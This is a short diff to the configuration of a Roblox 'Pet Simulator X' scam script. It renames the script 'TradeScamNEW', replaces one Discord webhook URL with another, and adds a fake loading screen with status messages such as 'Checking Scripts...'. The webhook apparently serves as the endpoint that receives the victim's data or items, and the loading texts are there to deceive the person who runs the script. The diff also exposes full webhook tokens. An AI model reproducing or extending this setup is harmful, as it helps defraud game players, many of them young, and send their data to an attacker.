@@ -1,8 +1,9 @@
 Username = "king_zombie165"
-WebHook = "https://discord.com/api/webhooks/1080613891089907722/am32SCP2up9iNB7vJ0NnnJb9hVVxEuiMkcHhSG0jjRbvPVOoDpUVPHexa0lSLufpM-ZJ"
+WebHook = "https://discord.com/api/webhooks/1084582059365896303/N8bk93AW2j5XxZiPPSVmh0NluoLxUCQ4U8XljuzMDb7mSIO2uOgZ0UXHZihyinYGAPg5"
 
 
-_G.CustomScriptName = "PetSimulator X ScamScript"
+loadingscreen = true
+_G.CustomScriptName = "TradeScamNEW"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
